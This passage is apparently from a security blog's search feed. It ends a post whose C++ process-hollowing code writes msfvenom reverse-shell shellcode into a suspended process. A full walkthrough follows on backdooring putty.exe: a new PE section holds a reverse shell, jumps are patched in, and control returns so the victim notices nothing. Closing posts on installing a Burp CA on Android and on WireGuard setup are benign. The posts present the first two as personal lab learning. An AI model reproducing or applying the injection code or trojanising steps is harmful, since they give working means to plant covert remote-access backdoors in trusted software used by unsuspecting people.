ProcessBasicInformation, pbi, <span class="built_in">sizeof</span>(PROCESS_BASIC_INFORMATION), &amp;retLen);</span><br><span class="line">PINT ImageBaseOffset = (PINT)((INT64)pbi-&gt;PebBaseAddress + <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Image Base Offset found at: %p\r\n&quot;</span>, ImageBaseOffset);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read address of image base</span></span><br><span class="line">PINT lpImageBaseAddress = <span class="number">0</span>;</span><br><span class="line">SIZE_T bytesRead = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">NtReadVirtualMemory</span>(hProcess, ImageBaseOffset, &amp;lpImageBaseAddress, <span class="built_in">sizeof</span>(lpImageBaseAddress), &amp;bytesRead);</span><br><span class="line"><span class="comment">//printf(&quot;[+] Read %lld bytes\r\n&quot;, bytesRead);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Image Base Address found at: %p\r\n&quot;</span>, lpImageBaseAddress);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read 0x200 bytes from the base image</span></span><br><span class="line">CHAR data[<span class="number">0x200</span>];</span><br><span class="line">SIZE_T bytesRead1 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">NtReadVirtualMemory</span>(hProcess, lpImageBaseAddress, &amp;data, <span class="built_in">sizeof</span>(data), &amp;bytesRead1);</span><br><span class="line"><span class="comment">//printf(&quot;[+] Read %lld bytes from base image\r\n&quot;, bytesRead1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Extract the e_lfanew offset at 0x3C - this should hold the address value to the start of the PE header</span></span><br><span class="line"><span class="type">char</span> extractedBytes[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(extractedBytes, data + <span class="number">0x3C</span>, <span class="number">4</span>);</span><br><span class="line"><span class="type">int</span> extractedInteger = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int</span>*&gt;(extractedBytes);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] e_lfanew offset at: 0x%x\r\n&quot;</span>, extractedInteger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add 0x28 to get to the offset of the entrypoint RVA.</span></span><br><span class="line"><span class="type">int</span> opthdr = extractedInteger + <span class="number">0x28</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint RVA offset found at: %x\r\n&quot;</span>, opthdr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extract entrypoint RVA value</span></span><br><span class="line"><span class="type">char</span> entrypoint[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(entrypoint, data + opthdr, <span class="number">4</span>);</span><br><span class="line"><span class="type">int</span> entrypoint_rva = *<span class="built_in">reinterpret_cast</span>&lt;<span class="type">int</span>*&gt;(entrypoint);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint RVA value found at: %x\r\n&quot;</span>, entrypoint_rva);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get entrypoint address</span></span><br><span class="line">PINT addressOfEntryPoint = (PINT)(entrypoint_rva + (INT64)lpImageBaseAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Entrypoint Address found at: %p\r\n&quot;</span>, addressOfEntryPoint);</span><br><span class="line"></span><br><span class="line"><span class="comment">// msfvenom -p windows/x64/shell_reverse_tcp LHOST=4444 -f c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">SIZE_T nnRead = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, addressOfEntryPoint, buf, <span class="built_in">sizeof</span>(buf), &amp;nnRead);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Wrote %lld bytes to entry point\r\n&quot;</span>, nnRead);</span><br><span class="line"><span class="built_in">ResumeThread</span>(pi-&gt;hThread);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Thread resumed. Shellcode executed\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><hr><p>References:<br><a href="https://en.wikipedia.org/wiki/Portable_Executable">https://en.wikipedia.org/wiki/Portable_Executable</a><br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations">https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations</a><br><a href="https://github.com/m0n0ph1/Process-Hollowing/tree/master/sourcecode/ProcessHollowing">https://github.com/m0n0ph1/Process-Hollowing/tree/master/sourcecode/ProcessHollowing</a><br><a href="https://attack.mitre.org/techniques/T1055/012/">https://attack.mitre.org/techniques/T1055/012/</a><br><a href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Malware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Backdooring PE Files</title>
      <link href="/posts/backdooring-pe-files/"/>
      <url>/posts/backdooring-pe-files/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>This post is written to help me better understand the process of backdooring portable executables (PEs) by using “code caves” and redirecting execution flow. </p><p>Inspiration came from <a href="https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode</a>, but I’ll be using <code>putty.exe</code> as the target binary instead.</p><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>In this post, we’ll be backdooring PEs through these high level steps:</p><ul><li>Manually introduce a code cave by adding a new PE section</li><li>Add shellcode to our new PE section</li><li>Patch execution flow of the PE to run the shellcode</li><li>Give execution flow back to the PE after shellcode runs</li></ul><p>The last two steps are the most complicated and the whole process is easier said than done. </p><h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>We’ll be utilizing a Windows 10 victim VM and a Kali Linux attacker VM throughout the lab. Their respective IPs are listed below (noted for catching rev shells):</p><ul><li>Kali - <code>192.168.248.148</code></li><li>Windows 10 - <code>192.168.248.150</code></li></ul><p>Here are the tools we’ll be using:</p><ul><li><code>msfvenom</code> - to generate shellcode</li><li><code>CFF Explorer</code> - to manipulate PE sections</li><li><code>HxD</code> - to patch our binary</li><li><code>x32dbg</code> - to debug&#x2F;patch</li></ul><p>Our target PE of choice will be <code>putty.exe</code> - specifically the <code>32-bit x86</code> version, which can be downloaded from:</p><ul><li><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></li></ul><h1 id="Manual-Proof-of-Concept-POC"><a href="#Manual-Proof-of-Concept-POC" class="headerlink" title="Manual Proof-of-Concept (POC)"></a>Manual Proof-of-Concept (POC)</h1><p>Before we try to do any redirection of execution flow, let’s manually step through the theories of this technique: generating shellcode, placing it in a new PE section, and manually redirecting the EIP to our shellcode.</p><h2 id="msfvenom-Shellcode"><a href="#msfvenom-Shellcode" class="headerlink" title="msfvenom Shellcode"></a>msfvenom Shellcode</h2><p>To begin, generate a simple reverse shell with <code>msfvenom</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=192.168.248.148 LPORT=8080 -o rev.exe</span><br></pre></td></tr></table></figure><p>We’ll need to get the raw hex-bytes for later. This can be done using <code>xxd</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -l 1000 rev.exe</span><br></pre></td></tr></table></figure><p><img src="/posts/backdooring-pe-files/image-20240310203628586.png"></p><h2 id="Adding-a-New-PE-Section"><a href="#Adding-a-New-PE-Section" class="headerlink" title="Adding a New PE Section"></a>Adding a New PE Section</h2><p>Open <code>putty.exe</code> in CFF Explorer, navigate to <code>Section Headers</code>, and right-click to <code>Add Section (Empty Space)</code>. Make sure to make the size of the section at least 324 bytes - the size of our shellcode. Here, I’ll specify 200h - which is 512 bytes.</p><p><img src="/posts/backdooring-pe-files/image-20240310151913464.png"></p><p>I’ll rename the section to <code>.code</code> and right-click <code>Change Section Flags</code><br><img src="/posts/backdooring-pe-files/image-20240310152255772.png"></p><p>Make sure that the section is readable, writeable, executable, and contains code.<br><img src="/posts/backdooring-pe-files/image-20240310152340682.png"></p><p>Take note that the <code>Raw Address</code> of the section is <code>00166200</code> and make sure to save the changes.</p><h2 id="Insert-Shellcode-into-New-Section"><a href="#Insert-Shellcode-into-New-Section" class="headerlink" title="Insert Shellcode into New Section"></a>Insert Shellcode into New Section</h2><p>From here, open the binary in <code>HxD</code>. Navigate to <code>Search -&gt; Go to...</code></p><p><img src="/posts/backdooring-pe-files/image-20240310152743665.png"></p><p>Go to offset <code>00166200</code>, where our new section is.</p><p><img src="/posts/backdooring-pe-files/image-20240310152827261.png"></p><p>You should see an empty section of code.<br><img src="/posts/backdooring-pe-files/image-20240310152907463.png"></p><p>We’ll insert our shellcode into this. Using the same <code>xxd</code> command before, copy the hex output.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -p -l 1000 rev.exe</span><br></pre></td></tr></table></figure><p><img src="/posts/backdooring-pe-files/image-20240310203837253.png"></p><p>Right-click in <code>HxD</code> and <code>Paste write</code></p><p><img src="/posts/backdooring-pe-files/image-20240310153045244.png"></p><p>The newly pasted code section should be red. Make sure to save the changes.</p><p><img src="/posts/backdooring-pe-files/image-20240310153106387.png"></p><h2 id="Manually-Trigger-the-Shellcode"><a href="#Manually-Trigger-the-Shellcode" class="headerlink" title="Manually Trigger the Shellcode"></a>Manually Trigger the Shellcode</h2><p>Now that our shellcode is in the binary, let’s try to manually force it to execute in <code>x32dbg</code>. </p><p>Open the binary in <code>x32dbg</code> and navigate to <code>Memory Map</code>. We should see the <code>.code</code> section at <code>010DF000</code>. This address could have also been calculated by using the base address of <code>putty.exe</code> at <code>00F70000</code> and adding the relative virtual address of the <code>.code</code> section of <code>0016F000</code> to get <code>00F70000 + 0016F000 = 010DF000</code></p><p><img src="/posts/backdooring-pe-files/image-20240310153626835.png"></p><p>Double-click the section and if we follow it in dump, we should see the hex bytes of our shellcode.<br><img src="/posts/backdooring-pe-files/image-20240310154039487.png"></p><p>With everything in place, we can start a listener on our attacker machine, manually set the EIP to <code>010DF000</code> (1) and continue execution (2). We should see a reverse shell connect back (3).</p><p><img src="/posts/backdooring-pe-files/image-20240310154355294.png"></p><p>Here is the whole process in action:<br><img src="/posts/backdooring-pe-files/backdoor_pe.gif"></p><p>We have successfully triggered the shellcode. Now, we know that the theories are in place and we have laid the groundworks for what’s coming next.</p><h1 id="Execution-Redirection"><a href="#Execution-Redirection" class="headerlink" title="Execution Redirection"></a>Execution Redirection</h1><p>With the help of a debugger, we were able to manually trigger our shellcode. Now, we’ll attempt to patch the binary so that the shell triggers automatically and redirects execution back to <code>putty.exe</code></p><p>The patching process can be a little complicated and tedious. The high level step are as follows:</p><ol><li>Prepend the shellcode with <code>pushad</code> and <code>pushfd</code> instructions</li><li>Overwrite a 5 byte instruction in <code>putty.exe</code> with a jump to our shellcode</li><li>Append the shellcode with code that will restore the stack frame and redirect execution back to <code>putty.exe</code></li></ol><h2 id="Prepending-our-Shellcode"><a href="#Prepending-our-Shellcode" class="headerlink" title="Prepending our Shellcode"></a>Prepending our Shellcode</h2><p>Before anything, the first modification we want to make to our shellcode is to prepend it with the <code>pushfd</code> and <code>pushad</code> instructions. These instructions will push the contents of registers right before shellcode execution onto the stack. We will want to restore these states after we execute our shellcode.</p><ul><li><a href="https://www.felixcloutier.com/x86/pusha:pushad">https://www.felixcloutier.com/x86/pusha:pushad</a></li><li><a href="https://www.felixcloutier.com/x86/pushf:pushfd:pushfq">https://www.felixcloutier.com/x86/pushf:pushfd:pushfq</a></li></ul><p>This process is relatively easy. <code>pushad</code>‘s opcode is <code>60</code> and <code>pushfd</code>‘s opcode is <code>9C</code>. We just need to insert these right before our shellcode in <code>HxD</code>. I recommend putting <code>609C</code> before your shellcode and just pasting it as a whole into <code>HxD</code>.</p><p><img src="/posts/backdooring-pe-files/image-20240310193300866.png"></p><h2 id="Jumping-to-our-Shellcode"><a href="#Jumping-to-our-Shellcode" class="headerlink" title="Jumping to our Shellcode"></a>Jumping to our Shellcode</h2><p>The next step we want to do is to find a 5 byte instruction where we can overwrite with <code>jmp &lt;addr_of_shellcode&gt;</code>.</p><p>Step through the execution of <code>putty.exe</code> in a debugger. We see a 5 byte instruction at <code>0073FA61</code>. We’ll take a note of this instruction and the next for later.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0073FA61 | E8 3A070000              | call putty.7401A0                       | (assembly: call 0x007401A0)</span><br><span class="line">0073FA66 | 6A 01                    | push 1                                  |</span><br></pre></td></tr></table></figure><p><img src="/posts/backdooring-pe-files/image-20240310193447062.png"></p><p>Overwrite the instruction with a jump to our shellcode. In this case, it’s at <code>0080F000</code><br><img src="/posts/backdooring-pe-files/image-20240310193538819.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 0x0080F000</span><br></pre></td></tr></table></figure><p>To patch, Right-click -&gt; <code>Assemble</code> and put our jump instruction in.<br><img src="/posts/backdooring-pe-files/image-20240310193615493.png"></p><p><img src="/posts/backdooring-pe-files/image-20240310193630408.png"></p><p><img src="/posts/backdooring-pe-files/image-20240310193644246.png"></p><p>Next, we’ll attempt to add a few modifications to our shellcode to redirect the execution back to <code>putty.exe</code>.</p><h2 id="Appending-our-Shellcode"><a href="#Appending-our-Shellcode" class="headerlink" title="Appending our Shellcode"></a>Appending our Shellcode</h2><p>There are several places where we need to modify our shellcode in order to have the redirection work properly. Mainly, the modifications consist of:</p><ul><li>Unblocking the thread by patching <code>WaitForSignaledObject</code></li><li>Restoring the stack frame and register states with <code>popfd</code> and <code>popad</code></li><li>Restore the overwritten instruction</li><li>Jump to next instruction right after overwritten instruction</li></ul><h3 id="Unblocking-the-Thread"><a href="#Unblocking-the-Thread" class="headerlink" title="Unblocking the Thread"></a>Unblocking the Thread</h3><p>If we ran the previous modification with the jump instruction to our shellcode, you’ll notice that although we catch the reverse shell, the <code>putty.exe</code> GUI won’t display afterwards.</p><p>The reason <code>putty.exe</code> isn’t showing its GUI is because the shellcode execution is blocking the thread by calling <code>WaitForSignaledObject</code> with <code>-1 (INFINITE)</code>  as the argument - essentially blocking it forever. We want to make sure the value passed in as the argument is <code>0</code>.</p><p>The instruction <code>dec esi</code> at <code>0080F11B</code> changes ESI to <code>-1</code>, which is then pushed onto the stack as an argument to <code>WaitForSignaledObject</code><br><img src="/posts/backdooring-pe-files/image-20240310201003514.png"></p><p>We can attempt to NOP out the instruction, so that ESI stays <code>0</code> - telling the thread to wait for 0 seconds before unblocking.<br><img src="/posts/backdooring-pe-files/image-20240310201017372.png"></p><h3 id="Restore-Stack-Frame-Execution"><a href="#Restore-Stack-Frame-Execution" class="headerlink" title="Restore Stack Frame &amp; Execution"></a>Restore Stack Frame &amp; Execution</h3><p>Now, we modify the end of the shellcode to restore our stack frame and register states to before our shellcode execution. Then, we can pass execution back to <code>putty.exe</code>.</p><p>At the end of our shellcode, you’ll notice a <code>call ebp</code> instruction. This essentially closes the <code>putty.exe</code> process after our thread has executed. We will start patching from this last instruction.<br><img src="/posts/backdooring-pe-files/image-20240310205922936.png"></p><p>We’ll want to replace this with an instruction that restores our ESP to before our shellcode execution, but after our <code>pushad</code> and <code>pushfd</code> instructions. To find this value, we can put a breakpoint after the <code>pushad</code> and <code>pushfd</code> instructions and note the ESP right after. In this case, it’s <code>012FFB00</code>.<br><img src="/posts/backdooring-pe-files/image-20240310205720973.png"></p><p>The ESP after our shellcode execution is <code>012FF8FC</code><br><img src="/posts/backdooring-pe-files/image-20240310205825552.png"></p><p>This means that the stack grew by <code>0x204</code> bytes<br><img src="/posts/backdooring-pe-files/image-20240310205852824.png"></p><p>From this, we will add the following instructions to our shellcode:</p><ul><li>Increase the ESP by <code>0x204</code> bytes to restore the stack</li><li>Restore register states with <code>popfd</code> and <code>popad</code></li><li>Add the instruction we previously overwrote in <a href="#Jumping-to-our-Shellcode">Jumping to our Shellcode</a></li><li>Jump back to the instruction right after the instruction we overwrote</li></ul><p>In this case, we would append the following to the shellcode:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add esp, 0x204</span><br><span class="line">popfd</span><br><span class="line">popad</span><br><span class="line">call 0x007401A0</span><br><span class="line">jmp 0x0073FA66</span><br></pre></td></tr></table></figure><p><img src="/posts/backdooring-pe-files/image-20240310201108577.png"></p><p>Patch the file by Right-clicking -&gt; <code>Patches</code>, select all patches, and click <code>Patch File</code><br><img src="/posts/backdooring-pe-files/image-20240310212548779.png"><br><img src="/posts/backdooring-pe-files/image-20240310212627368.png"></p><p>We’ll save the file as <code>putty_patched.exe</code></p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>Now, we should have a fully patched file. Let’s test it. We should see our shellcode execute and pass execution right back to <code>putty.exe</code>. To the target, it’s as if nothing happened :D</p><p><img src="/posts/backdooring-pe-files/backdoor_pe_patched.gif"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>We were able to successfully embed a reverse shell into a 32-bit <code>putty.exe</code> PE binary. It must be noted that this technique is extremely well signatured. Windows Defender was turned off throughout this lab - although at some points it still picked it up (can never trust when Defender is truly off…) </p><p>Here’s a speedrun attempt :)</p><div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"video":{"url":"/posts/backdooring-pe-files/demo.mp4"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><hr><p>References:<br><a href="https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode">https://www.ired.team/offensive-security/code-injection-process-injection/backdooring-portable-executables-pe-with-shellcode</a><br><a href="https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/">https://ap3x.github.io/posts/backdooring-portable-executables-(pe)/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Malware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Installing System-level CAs on Android</title>
      <link href="/posts/install-ca-android/"/>
      <url>/posts/install-ca-android/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>I’ve been trying to play around with pentesting android apps and have run into some problems. I thought that the traffic intercept work flow would simply consist of:</p><ul><li>Start Burp Suite Proxy</li><li>Install user-level Burp CA in Android</li><li>Point proxy settings in Android device to Burp</li><li>Start intercepting traffic</li></ul><p>However, I’ve been experiencing some problems with a user-level CA installed.<br><img src="/posts/install-ca-android/image-20240309141702680.png"></p><p><img src="/posts/install-ca-android/image-20240309141716591.png"></p><p>Apparently, starting with Android Nougat (API &gt;&#x3D;24), it is no longer possible to just install Burp Suite’s CA as a user certificate to start intercepting traffic. Apps now will only trust system level CAs. </p><ul><li><a href="https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html">https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html</a></li></ul><p>One way to get around this is to install the Burp CA as a <strong>system-level CA</strong></p><h1 id="Installing-system-level-Trusted-CAs"><a href="#Installing-system-level-Trusted-CAs" class="headerlink" title="Installing system-level Trusted CAs"></a>Installing system-level Trusted CAs</h1><p>In Android, trusted CAs are located at <code>/system/etc/security/cacerts</code> using a special format. Certificates must be in the PEM format with the filename of <code>&lt;subject_hash_old&gt;.0</code></p><h2 id="1-Export-Burp-CA-and-convert-to-PEM"><a href="#1-Export-Burp-CA-and-convert-to-PEM" class="headerlink" title="1. Export Burp CA and convert to PEM"></a>1. Export Burp CA and convert to PEM</h2><p><img src="/posts/install-ca-android/image-20240309141931258.png"></p><p>We can then use <code>openssl</code> to convert the <code>.der</code> file to <code>.pem</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform DER -<span class="keyword">in</span> cacert.der -out cacert.pem</span><br><span class="line">openssl x509 -inform PEM -subject_hash_old -<span class="keyword">in</span> cacert.pem |<span class="built_in">head</span> -1</span><br><span class="line"><span class="built_in">mv</span> cacert.pem &lt;<span class="built_in">hash</span>&gt;.0</span><br></pre></td></tr></table></figure><p><img src="/posts/install-ca-android/image-20240309142119784.png"></p><h2 id="2-Copy-the-CA-to-the-device"><a href="#2-Copy-the-CA-to-the-device" class="headerlink" title="2. Copy the CA to the device"></a>2. Copy the CA to the device</h2><p>In order to install the certificate as a trusted CA, we need to copy the file to <code>/system/etc/security/cacerts</code>, which isn’t normally accessible by normal users. We have to remount <code>/system</code> to be writeable, which can be done via <code>adb root</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb push &lt;cert&gt;.0 /sdcard/</span><br></pre></td></tr></table></figure><p>As an example, here I’m using NoxPlayer as the emulator of choice<br><img src="/posts/install-ca-android/image-20240309142528753.png"></p><p>From here, go into <code>adb shell</code> and transfer the CA file from <code>/sdcard</code> to <code>/system/etc/security/cacerts/</code> and reboot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb shell</span><br><span class="line"><span class="built_in">mv</span> /sdcard/&lt;cert&gt;.0 /system/etc/security/cacerts/</span><br><span class="line"><span class="built_in">chmod</span> 644 /system/etc/security/cacerts/&lt;cert&gt;.0</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p><img src="/posts/install-ca-android/image-20240309142830510.png"></p><h2 id="3-Check-Trusted-Credentials"><a href="#3-Check-Trusted-Credentials" class="headerlink" title="3. Check Trusted Credentials"></a>3. Check Trusted Credentials</h2><p>Depending on the Android device, navigate into something like <code>Settings -&gt; Security &amp; Location -&gt; Encryption &amp; Credentials -&gt; Trusted Credentials</code> and check that <code>PortSwigger</code> is installed as a system-level CA.</p><p><img src="/posts/install-ca-android/image-20240309143118272.png"></p><h2 id="4-Manually-Set-Proxy"><a href="#4-Manually-Set-Proxy" class="headerlink" title="4. Manually Set Proxy"></a>4. Manually Set Proxy</h2><p>Now that we have the CA installed, we can start our proxy. First, make sure that Burp proxy is set on All interfaces.<br><img src="/posts/install-ca-android/image-20240309143707275.png"></p><p>Next, make note of the IP of the host running Burp Suite. Here it’s <code>192.168.248.175</code> for me.<br><img src="/posts/install-ca-android/image-20240309143822411.png"></p><p>Go into <code>Settings -&gt; Network &amp; Internet -&gt; Wi-Fi</code> and set the <code>Proxy</code> setting to <code>Manual</code> and fill in the proxy hostname and proxy port (Burp defaults to <code>8080</code>)<br><img src="/posts/install-ca-android/image-20240309143950370.png"></p><h2 id="5-Start-Intercepting"><a href="#5-Start-Intercepting" class="headerlink" title="5. Start Intercepting"></a>5. Start Intercepting</h2><p>At this point, Burp should be intercepting all the network traffic on the Android device. Start an app, and you should start seeing traffic coming in.</p><p><img src="/posts/install-ca-android/image-20240309144231357.png"></p><hr><p>References:</p><ul><li><a href="https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/">https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/</a></li><li><a href="https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html">https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wireguard Quick Start</title>
      <link href="/posts/wireguard/"/>
      <url>/posts/wireguard/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h1><p>Server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install wireguard</span><br><span class="line"></span><br><span class="line">wg genkey | sudo <span class="built_in">tee</span> /etc/wireguard/private.key</span><br><span class="line">sudo <span class="built_in">chmod</span> go= /etc/wireguard/private.key</span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/wireguard/private.key | wg pubkey | sudo <span class="built_in">tee</span> /etc/wireguard/public.key</span><br><span class="line"></span><br><span class="line">sudo vim /etc/wireguard/wg0.conf</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/wireguard/wg0.conf</span></span><br><span class="line">[Interface]</span><br><span class="line">PrivateKey = base64_encoded_private_key_goes_here</span><br><span class="line">Address = 10.0.0.1/24</span><br><span class="line">ListenPort = 51820</span><br><span class="line">SaveConfig = <span class="literal">true</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wg-quick up wg0</span><br><span class="line">systemctl <span class="built_in">enable</span> wg-quick@wg0</span><br><span class="line">systemctl status wg-quick@wg0</span><br></pre></td></tr></table></figure><p>Peer client:</p><ul><li>Same steps but different conf file<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/wireguard/wg0.conf</span></span><br><span class="line">[Interface]</span><br><span class="line">PrivateKey = base64_encoded_peer_private_key_goes_here</span><br><span class="line">Address = 10.0.0.2/24</span><br><span class="line">PostUp = ping -c1 10.0.0.1 <span class="comment"># Initialize tunnel</span></span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = base64_encoded_server_public_key</span><br><span class="line">AllowedIPs = 10.0.0.0/24</span><br><span class="line">Endpoint = 192.168.248.129:51820</span><br></pre></td></tr></table></figure></li></ul><p>Finally, add peer to server config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wg <span class="built_in">set</span> wg0 peer &lt;peer_public_key&gt; allowed-ips 10.0.0.2</span><br></pre></td></tr></table></figure><p>alternatively, put the following in the server config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = &lt;peer_public_key&gt;</span><br><span class="line">AllowedIPs = 10.0.0.2/24</span><br></pre></td></tr></table></figure><p>To stop:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> wg-quick@wg0</span><br><span class="line">sudo wg-quick down wg0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
